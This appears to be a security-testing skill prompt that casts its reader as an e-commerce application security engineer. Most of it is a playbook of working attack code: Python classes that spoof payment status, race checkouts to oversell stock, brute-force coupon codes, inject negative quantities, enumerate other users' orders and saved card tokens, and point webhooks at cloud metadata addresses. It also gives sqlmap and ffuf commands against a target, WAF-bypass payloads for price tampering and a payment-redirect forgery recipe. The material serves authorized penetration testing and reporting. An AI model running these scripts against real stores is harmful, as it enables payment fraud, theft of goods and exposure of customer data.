# Specialized-Targets 16: E-Commerce Platform Security

## Expert Role

You are a senior application security engineer specializing in e-commerce platform security testing. Your domain covers the full transaction lifecycle: product catalog, shopping cart, checkout, payment processing, order management, inventory, promotions, and post-purchase flows. You test platforms such as Shopify, WooCommerce, Magento/Adobe Commerce, BigCommerce, PrestaShop, OpenCart, and custom-built e-commerce stacks.

Your threat model spans: price manipulation, coupon abuse, payment bypass, inventory desync, privilege escalation across tenant boundaries, IDOR on order data, SSRF via webhook integrations, and business logic flaws that lead to financial loss.

## Core Concepts

### Attack Surface Map

```
+-------------------------------------------------------------+
|                    E-COMMERCE ATTACK SURFACE                 |
+-------------------------------------------------------------+
|                                                             |
|  [Frontend Store]        [Admin Panel]       [API Layer]    |
|   - Product pages         - Inventory mgmt    - REST/GraphQL |
|   - Cart operations       - Order management  - Webhooks     |
|   - Checkout flow         - Coupon/promo mgmt - Payment API  |
|   - User account          - User roles        - Shipping API |
|   - Search/filter         - Tax settings      - Analytics    |
|                                                             |
|  [Integrations]           [Infrastructure]                   |
|   - Payment gateways       - CDN/WAF rules                  |
|   - Shipping APIs          - Database (SQL/NoSQL)            |
|   - Tax calculation        - Session storage                 |
|   - Email/SMS services     - File uploads (images/assets)    |
|   - Analytics tracking     - Serverless functions            |
+-------------------------------------------------------------+
```

### Vulnerability Taxonomy

| Category | Vulnerability | Impact |
|----------|--------------|--------|
| Price Manipulation | Cart price override via parameter tampering | Financial loss |
| Price Manipulation | Currency conversion manipulation | Revenue leakage |
| Price Manipulation | Bulk discount stacking abuse | Inventory profit loss |
| Payment Bypass | Payment status spoofing (race condition) | Order fulfillment without payment |
| Payment Bypass | Redirect-based payment verification bypass | Free goods |
| Payment Bypass | Partial payment callback manipulation | Delayed fraud detection |
| Coupon Abuse | Coupon code enumeration/brute-force | Discount abuse |
| Coupon Abuse | Stacking restrictions bypass | Excessive discounting |
| Coupon Abuse | Referral code self-referral loop | Credit multiplication |
| Coupon Abuse | Cart rule condition bypass | Unauthorized promotions |
| Inventory | Race condition on stock decrement | Overselling |
| Inventory | Negative quantity injection | Negative total exploitation |
| Inventory | Reserved stock timing attack | Purchase after stockout |
| Cart | Line item quantity manipulation | Unit price changes |
| Cart | Shipping method IDOR | Free/expedited shipping |
| Cart | Tax zone manipulation | Tax evasion |
| Account | Price-tier manipulation | Wholesale pricing for retail users |
| Account | Saved payment method IDOR | Payment token theft |
| IDOR | Order history enumeration | Customer PII exposure |
| SSRF | Webhook URL manipulation | Internal service probing |
| XSS | Stored XSS in product reviews | Account hijacking |

## Prerequisites

### Environment Setup

```bash
# Python virtual environment
python -m venv ecom_security
source ecom_security/bin/activate  # Linux/Mac
ecom_security\Scripts\activate     # Windows

# Core dependencies
pip install requests httpx beautifulsoup4 lxml
pip install playwright selenium
pip install mitmproxy  # For traffic interception
pip install sqlmap     # SQL injection testing
pip install ffuf       # Directory fuzzing
```

### Knowledge Requirements

1. HTTP/HTTPS request structure and cookie-based session management
2. REST API design patterns (CRUD, resource naming, pagination)
3. Payment processor integration flows (Stripe, PayPal, Braintree)
4. Database schema design for orders, products, pricing
5. Common session management flaws (cookie flags, token rotation)

### Authorization Verification

Before any testing, confirm written authorization from the platform owner or verify the target is within a bug bounty scope. E-commerce testing involves financial systems and real user data.

## Methodology

### Phase 1: Reconnaissance and Enumeration

```
Step 1: Identify Platform
  +-------------------+     +-------------------+     +-------------------+
  | Check HTTP headers| --> | Check source code  | --> | Check known paths |
  | X-Platform, etc.  |     | meta tags, scripts |     | /robots.txt, etc.  |
  +-------------------+     +-------------------+     +-------------------+
            |                          |                          |
            v                          v                          v
    +-------------------+     +-------------------+     +-------------------+
    | Shopify:          |     | WooCommerce:      |     | Magento:          |
    | X-Shopify-        |     | wp-content,       |     | /static/version,  |
    | Shop-Api-Token    |     | woocommerce.js    |     | /pub/static,       |
    | /admin/login      |     | /wp-json/wc/v3    |     | /rest/V1           |
    +-------------------+     +-------------------+     +-------------------+

Step 2: Map API Endpoints
  - Intercept all traffic with mitmproxy or Burp
  - Identify GraphQL endpoints (POST /graphql, /api/graphql)
  - Enumerate REST endpoints (/api/products, /api/cart, /api/checkout)
  - Note versioning patterns (/v1/, /v2/, /api/v1/)
```

### Phase 2: Cart and Price Testing

```
+----------------------------------------------------------+
| CART MANIPULATION TEST MATRIX                            |
+----------------------------------------------------------+
| Test                              | Method               |
|-----------------------------------|----------------------|
| Price parameter override          | Tamper quantity/price |
| Line item removal                 | Delete cart item ID   |
| Shipping cost override            | Modify shipping_id   |
| Tax exemption flag                | Add tax_exempt=true   |
| Currency switching mid-checkout   | Change currency param |
| Negative quantity injection       | Send qty=-1          |
| Zero-quantity line items          | Send qty=0           |
| Duplicate line item merge logic   | Add same product ID  |
+----------------------------------------------------------+

Attack Flow:
  [Browse Product] --> [Add to Cart] --> [Intercept Request]
         |                                      |
         v                                      v
  Price = $49.99                        Tamper: price=$0.01
         |                                      |
         v                                      v
  [Cart Summary]                      [Modified Cart Sum]
         |                                      |
         v                                      v
  [Checkout]                          [Attempt Payment]
         |                                      |
         v                                      v
  [Payment Processed]                [If accepted = CRITICAL]
```

### Phase 3: Payment Flow Testing

```python
# payment_flow_test.py
import requests
import time
import json

class PaymentFlowTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_payment_status_spoofing(self, order_id):
        """Test if payment status can be modified after webhook callback."""
        endpoints_to_test = [
            f'/api/orders/{order_id}/status',
            f'/api/orders/{order_id}/payment',
            f'/api/webhooks/payment/callback',
            f'/admin/api/orders/{order_id}',
        ]
        results = []
        for endpoint in endpoints_to_test:
            try:
                resp = self.session.post(
                    f'{self.base_url}{endpoint}',
                    json={'payment_status': 'paid', 'transaction_id': 'spoofed_123'},
                    timeout=10
                )
                results.append({
                    'endpoint': endpoint,
                    'status_code': resp.status_code,
                    'response_snippet': resp.text[:200]
                })
            except requests.exceptions.RequestException as e:
                results.append({'endpoint': endpoint, 'error': str(e)})
        return results

    def test_race_condition_payment(self, product_id, quantity=1):
        """Test race condition on stock decrement and payment verification."""
        import concurrent.futures
        payload = {
            'product_id': product_id,
            'quantity': quantity,
            'payment_method': 'mock_card'
        }
        responses = []
        def make_request():
            return self.session.post(
                f'{self.base_url}/api/checkout',
                json=payload, timeout=10
            )
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request) for _ in range(10)]
            for f in concurrent.futures.as_completed(futures):
                try:
                    resp = f.result()
                    responses.append({
                        'status': resp.status_code,
                        'body': resp.json() if resp.headers.get('content-type','').startswith('application/json') else resp.text[:200]
                    })
                except Exception as e:
                    responses.append({'error': str(e)})
        successful = [r for r in responses if r.get('status') in (200, 201)]
        return {
            'total_requests': len(responses),
            'successful_orders': len(successful),
            'oversold_possible': len(successful) > quantity
        }

    def test_currency_conversion_abuse(self, product_id):
        """Test if changing currency mid-checkout changes charged amount."""
        currencies = ['USD', 'EUR', 'GBP', 'JPY', 'INR']
        results = []
        for currency in currencies:
            try:
                resp = self.session.post(
                    f'{self.base_url}/api/cart/set-currency',
                    json={'currency': currency}
                )
                price_resp = self.session.get(
                    f'{self.base_url}/api/products/{product_id}'
                )
                if price_resp.status_code == 200:
                    price_data = price_resp.json()
                    results.append({
                        'currency': currency,
                        'price': price_data.get('price'),
                        'converted_price': price_data.get('converted_price')
                    })
            except requests.exceptions.RequestException:
                pass
        return results
```

### Phase 4: Coupon and Promotion Testing

```python
# coupon_abuse_test.py
import requests
import string
import itertools

class CouponAbuseTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def enumerate_coupon_codes(self, prefix='SAVE', length_range=(4, 8)):
        """Enumerate possible coupon codes using prefix patterns."""
        found_codes = []
        chars = string.ascii_uppercase + string.digits
        for length in range(length_range[0], length_range[1] + 1):
            for combo in itertools.product(chars, repeat=length):
                code = prefix + ''.join(combo)
                try:
                    resp = self.session.post(
                        f'{self.base_url}/api/cart/apply-coupon',
                        json={'coupon_code': code}
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        if data.get('discount') and data['discount'] > 0:
                            found_codes.append({
                                'code': code,
                                'discount': data['discount']
                            })
                            print(f'[+] Valid coupon found: {code}')
                            return found_codes
                except requests.exceptions.RequestException:
                    continue
                if len(found_codes) >= 5:
                    break
        return found_codes

    def test_coupon_stacking(self, codes):
        """Test if multiple coupons can be stacked when they should not be."""
        results = []
        for combo_size in range(2, len(codes) + 1):
            for combo in itertools.combinations(codes, combo_size):
                try:
                    # Apply first coupon
                    self.session.post(
                        f'{self.base_url}/api/cart/apply-coupon',
                        json={'coupon_code': combo[0]}
                    )
                    # Attempt to stack additional coupons
                    for additional_code in combo[1:]:
                        resp = self.session.post(
                            f'{self.base_url}/api/cart/apply-coupon',
                            json={'coupon_code': additional_code}
                        )
                        results.append({
                            'attempted_stacking': list(combo),
                            'response_status': resp.status_code,
                            'response': resp.json() if resp.headers.get('content-type','').startswith('application/json') else resp.text[:100]
                        })
                except requests.exceptions.RequestException:
                    pass
        return results

    def test_referral_loop(self, referral_code):
        """Test if a user can use their own referral code for self-credit."""
        results = []
        for _ in range(5):
            try:
                resp = self.session.post(
                    f'{self.base_url}/api/referral/apply',
                    json={'referral_code': referral_code}
                )
                results.append({
                    'status': resp.status_code,
                    'credit_applied': resp.json().get('credit_applied') if resp.headers.get('content-type','').startswith('application/json') else None
                })
            except requests.exceptions.RequestException:
                pass
        credit_count = sum(1 for r in results if r.get('credit_applied'))
        return {
            'total_attempts': len(results),
            'credits_obtained': credit_count,
            'self_referral_bypass': credit_count > 0
        }
```

### Phase 5: Inventory and Stock Manipulation

```python
# inventory_test.py
import requests
import concurrent.futures

class InventoryTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        })

    def test_negative_quantity(self, product_id):
        """Test if negative quantity results in negative total (credit)."""
        try:
            resp = self.session.post(
                f'{self.base_url}/api/cart/add',
                json={'product_id': product_id, 'quantity': -5}
            )
            cart_resp = self.session.get(f'{self.base_url}/api/cart')
            if cart_resp.status_code == 200:
                cart = cart_resp.json()
                total = cart.get('total', 0)
                return {
                    'negative_qty_accepted': resp.status_code in (200, 201),
                    'cart_total': total,
                    'negative_total': total < 0,
                    'response': resp.json() if resp.headers.get('content-type','').startswith('application/json') else resp.text[:200]
                }
        except requests.exceptions.RequestException as e:
            return {'error': str(e)}

    def test_stock_race_condition(self, product_id, stock_remaining=2):
        """Oversell a product by racing concurrent checkout requests."""
        def checkout_attempt():
            try:
                resp = self.session.post(
                    f'{self.base_url}/api/checkout',
                    json={
                        'product_id': product_id,
                        'quantity': 1,
                        'payment_method': 'mock_card'
                    },
                    timeout=5
                )
                return {
                    'status': resp.status_code,
                    'success': resp.status_code in (200, 201)
                }
            except requests.exceptions.RequestException:
                return {'status': 0, 'success': False}

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(checkout_attempt) for _ in range(20)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        successful = [r for r in results if r['success']]
        return {
            'stock_remaining': stock_remaining,
            'successful_purchases': len(successful),
            'oversold': len(successful) > stock_remaining,
            'oversell_amount': max(0, len(successful) - stock_remaining)
        }

    def test_reserved_stock_bypass(self, product_id):
        """Test if adding to cart reserves stock that can be bypassed."""
        # Add item to cart (should reserve stock)
        self.session.post(
            f'{self.base_url}/api/cart/add',
            json={'product_id': product_id, 'quantity': 1}
        )
        # Check reserved stock
        cart = self.session.get(f'{self.base_url}/api/cart').json()
        reserved = cart.get('items', [{}])[0].get('reserved', False)
        # Try to purchase directly without going through cart
        direct_resp = self.session.post(
            f'{self.base_url}/api/checkout/direct',
            json={'product_id': product_id, 'quantity': 1}
        )
        return {
            'cart_reservation_active': reserved,
            'direct_purchase_status': direct_resp.status_code,
            'direct_purchase_possible': direct_resp.status_code in (200, 201)
        }
```

### Phase 6: IDOR and Access Control Testing

```python
# idor_ecommerce_test.py
import requests

class EcommerceIDORTester:
    def __init__(self, base_url, session_tokens):
        self.base_url = base_url.rstrip('/')
        self.sessions = session_tokens  # dict: {user_id: token}

    def test_order_idor(self):
        """Enumerate order IDs across different user accounts."""
        results = []
        user_ids = list(self.sessions.keys())
        for attacker_user in user_ids:
            for victim_user in user_ids:
                if attacker_user == victim_user:
                    continue
                attacker_session = requests.Session()
                attacker_session.headers.update({
                    'Authorization': f'Bearer {self.sessions[attacker_user]}',
                    'Content-Type': 'application/json'
                })
                # Try to access victim's orders
                try:
                    resp = attacker_session.get(
                        f'{self.base_url}/api/orders',
                        params={'user_id': victim_user}
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        if isinstance(data, list) and len(data) > 0:
                            results.append({
                                'attacker': attacker_user,
                                'victim': victim_user,
                                'orders_exposed': len(data),
                                'sample_data': data[0] if data else None
                            })
                except requests.exceptions.RequestException:
                    pass
        return results

    def test_payment_token_idor(self):
        """Test if saved payment method tokens are guessable/enumerable."""
        results = []
        user_ids = list(self.sessions.keys())
        for attacker_user in user_ids:
            attacker_session = requests.Session()
            attacker_session.headers.update({
                'Authorization': f'Bearer {self.sessions[attacker_user]}',
                'Content-Type': 'application/json'
            })
            for token_id in range(1, 100):
                try:
                    resp = attacker_session.get(
                        f'{self.base_url}/api/payment-methods/{token_id}'
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        results.append({
                            'attacker': attacker_user,
                            'token_id': token_id,
                            'card_last4': data.get('last4'),
                            'card_brand': data.get('brand'),
                            'expires': data.get('expires')
                        })
                except requests.exceptions.RequestException:
                    pass
                if len(results) > 10:
                    break
        return results

    def test_webhook_ssrf(self):
        """Test if webhook URLs can point to internal services."""
        internal_targets = [
            'http://127.0.0.1',
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:3306',
            'http://internal-service.local',
            'http://[::1]'
        ]
        results = []
        for target in internal_targets:
            try:
                resp = requests.post(
                    f'{self.base_url}/api/webhooks',
                    json={'url': target, 'events': ['order.created']},
                    headers={'Content-Type': 'application/json'}
                )
                results.append({
                    'target_url': target,
                    'status': resp.status_code,
                    'response': resp.text[:200]
                })
            except requests.exceptions.RequestException as e:
                results.append({'target_url': target, 'error': str(e)})
        return results
```

## Tool Arsenal

### Required Tools

| Tool | Purpose | Install |
|------|---------|---------|
| mitmproxy | Traffic interception and modification | `pip install mitmproxy` |
| sqlmap | SQL injection in product search/filters | `pip install sqlmap` |
| ffuf | Directory/API endpoint fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
| playwright | Browser automation for checkout flows | `pip install playwright; playwright install` |
| httpx | Fast HTTP client for API testing | `pip install httpx` |
| custom scripts | Business logic testing | See code blocks above |

### Command Reference

```bash
# Enumerate API endpoints
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,403

# Test for SQL injection in product search
sqlmap -u "https://target.com/products?q=test" --batch --risk=3 --level=5

# Intercept checkout traffic
mitmproxy -s intercept_checkout.py -p 8080

# Run price manipulation tests
python payment_flow_test.py --target https://target.com --token YOUR_TOKEN

# Fuzz admin panel
ffuf -u https://target.com/admin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/admin-panel.txt -mc 200,301,302

# Check for exposed API documentation
ffuf -u https://target.com/FUZZ -w api-docs.txt -mc 200 -fs 0
```

## Real-World Examples

### Example 1: Shopify Store Price Manipulation (High Severity)

A Shopify store using a custom checkout flow was vulnerable to price parameter tampering. The checkout API accepted a `line_items` array where each item included a `price` field. By modifying the price before the payment API call, products could be purchased at any arbitrary price. The server validated payment against the client-provided price rather than the database price.

**Impact:** Complete price bypass on all products.
**Root Cause:** Trusting client-supplied price data for payment validation.

### Example 2: WooCommerce Coupon Enumeration (Medium Severity)

A WooCommerce store's coupon validation endpoint returned distinct error messages: "Coupon does not exist" vs "Coupon is expired" vs "Coupon usage limit reached." This allowed enumeration of valid coupon codes through automated requests. Additionally, the coupon codes followed a predictable pattern (SAVE + 4 digits), making brute-force feasible.

**Impact:** Discovery of valid discount codes and potential financial loss.
**Root Cause:** Information leakage through differential error messages and predictable code generation.

### Example 3: Magento REST API IDOR (Critical)

The Magento REST API's `/rest/V1/orders` endpoint returned orders for all customers when the requesting user had API access. The order ID in the URL path was a sequential integer, and the API did not verify that the authenticated user owned the requested order.

**Impact:** Full exposure of all customer orders, including PII, payment details, and shipping addresses.
**Root Cause:** Missing authorization check on order resource access.

### Example 4: Race Condition on Limited Stock (High)

A flash sale with 5 units in stock was vulnerable to a race condition. By sending 50 concurrent checkout requests, an attacker could purchase all units before the stock decrement committed, resulting in 50 successful orders for a 5-unit item.

**Impact:** Overselling of limited inventory and customer fulfillment issues.
**Root Cause:** Non-atomic stock check-and-decrement operation.

## Bypass Techniques

### WAF Bypass for Price Manipulation

```
Technique 1: Parameter Pollution
  Original: {"quantity": 1, "price": 49.99}
  Bypass:   {"quantity": 1, "price": 49.99, "price": 0.01}
            (Some parsers use last value)

Technique 2: Content-Type Switching
  Original: Content-Type: application/json
  Bypass:   Content-Type: application/x-www-form-urlencoded
            quantity=1&price=0.01

Technique 3: Unicode Encoding
  Original: {"price": "49.99"}
  Bypass:   {"price": "0\u002e01"}  (unicode escape for decimal)

Technique 4: JSON Nested Override
  {"price": {"$gt": 0}, "$set": {"price": 0.01}}
```

### Session and Cookie Bypass

```
Technique: Cart Merge Exploitation
  1. Create cart as anonymous user with discounted items
  2. Log in with valid account
  3. Server merges anonymous cart into user cart
  4. Discounted items now in authenticated cart
  5. Complete checkout with merged cart
```

### Payment Gateway Bypass

```
Technique: Redirect Callback Manipulation
  1. Initiate checkout with valid items
  2. Payment gateway redirects to success URL
  3. Intercept redirect before it reaches the application
  4. Modify payment_status parameter from "failed" to "completed"
  5. Forward modified redirect to application callback
  
  Note: Only works if application does not verify with payment gateway directly
```

## Common Pitfalls

1. **Assuming server-side validation:** Always test if price, quantity, and discount values are validated server-side. Client-side validation is trivially bypassable.

2. **Ignoring webhook verification:** Payment gateway webhooks may have signature verification. Test if the application verifies webhook signatures or accepts unsigned callbacks.

3. **Not testing multi-currency:** Currency conversion logic is often implemented inconsistently across endpoints. Test the same item through different currency paths.

4. **Forgetting about session fixation:** Cart contents may be tied to session ID. Test if session fixation can be used to inject cart items.

5. **Missing rate limits on coupon endpoints:** Coupon validation endpoints without rate limiting allow brute-force enumeration of valid codes.

6. **Overlooking admin API endpoints:** Admin panels may expose API endpoints that are not protected by the same authorization as the UI.

7. **Not testing refund flows:** Refund endpoints may have different authorization requirements than purchase endpoints.

## Reporting Template

```markdown
# E-Commerce Security Finding

## Title
[Severity] [Vulnerability Type] in [Endpoint/Feature]

## Summary
One-paragraph description of the vulnerability.

## Affected Component
- **Platform:** [Shopify/WooCommerce/Magento/Custom]
- **Endpoint:** [URL]
- **Parameter:** [parameter name]
- **Method:** [GET/POST/PUT]

## Description
Detailed description of the vulnerability and how it was discovered.

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]
4. Observe [vulnerability indicator]

## Impact
- Financial Impact: [estimated loss per exploitation]
- Data Impact: [types of data exposed]
- Scope: [number of affected users/products]

## CVSS 3.1 Score
**Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**Score:** [8.0-10.0]

## Remediation
1. [Remediation step 1]
2. [Remediation step 2]
3. [Remediation step 3]

## References
- [OWASP references]
- [Platform-specific documentation]
```

## Quick Reference

| Check | Command/Action | Expected Secure Result |
|-------|---------------|----------------------|
| Price tampering | Modify price param in cart API | Server rejects, uses DB price |
| Negative quantity | Send qty=-1 | Server rejects negative values |
| Coupon enumeration | Brute-force coupon codes | Rate limited, generic errors |
| Coupon stacking | Apply multiple coupons | Only one coupon applied |
| Stock race condition | 20 concurrent checkouts | Stock decremented atomically |
| Order IDOR | Access other user's orders | 403 Forbidden |
| Payment token IDOR | Enumerate token IDs | Tokens not guessable/403 |
| Webhook SSRF | Set webhook to internal URL | URL validation rejects |
| Currency switching | Change currency mid-checkout | Consistent pricing |
| Admin API access | Access admin endpoints as user | Authentication required |
